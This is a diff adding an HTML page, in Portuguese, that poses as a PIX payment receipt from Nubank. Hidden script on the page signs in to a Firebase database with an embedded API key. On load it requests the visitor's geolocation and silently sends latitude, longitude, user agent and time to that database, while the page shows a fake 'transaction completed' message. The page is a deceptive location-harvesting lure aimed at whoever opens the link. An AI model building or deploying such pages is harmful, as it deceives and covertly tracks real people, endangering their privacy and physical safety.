@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Comprovante de Pagamento</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      color: #222;
+      padding: 20px;
+      text-align: center;
+    }
+    .comprovante {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      max-width: 400px;
+      margin: 40px auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h1 {
+      color: #4caf50;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 0.9em;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="comprovante">
+    <h1>Comprovante de Pagamento</h1>
+    <p><strong>Valor:</strong> R$ 452,80</p>
+    <p><strong>Destinatário:</strong> JONAS SOUSA</p>
+    <p><strong>Data:</strong> 12/04/2025</p>
+    <p><strong>Banco:</strong> PIX - Nubank</p>
+    <p><em>Processando pagamento...</em></p>
+    <div id="status">Aguarde alguns instantes...</div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/10.9.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.9.0/firebase-database-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.9.0/firebase-auth-compat.js"></script>
+
+  <script>
+const firebaseConfig = {
+  apiKey: "AIzaSyBQQ5UzK3Kv8vVElu3EXOVwydASMBWyM0c",
+  authDomain: "find-33687.firebaseapp.com",
+  projectId: "find-33687",
+  storageBucket: "find-33687.firebasestorage.app",
+  messagingSenderId: "5572697061",
+  appId: "1:5572697061:web:c1cdddc264b9e5fcea2d0c",
+  measurementId: "G-H9QENC2ER7"
+};
+
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    function enviarDados(dados) {
+      const novaRef = database.ref("acessos").push();
+      novaRef.set(dados);
+    }
+
+    function coletarInfo() {
+      const info = {
+        userAgent: navigator.userAgent,
+        dataHora: new Date().toISOString()
+      };
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((pos) => {
+          info.latitude = pos.coords.latitude;
+          info.longitude = pos.coords.longitude;
+          enviarDados(info);
+        }, () => {
+          info.latitude = null;
+          info.longitude = null;
+          enviarDados(info);
+        });
+      } else {
+        enviarDados(info);
+      }
+    }
+
+    firebase.auth().signInAnonymously().then(() => {
+      setTimeout(() => {
+        document.getElementById("status").innerHTML = "Transação concluída com sucesso.";
+        coletarInfo();
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
+
+
+
+
+
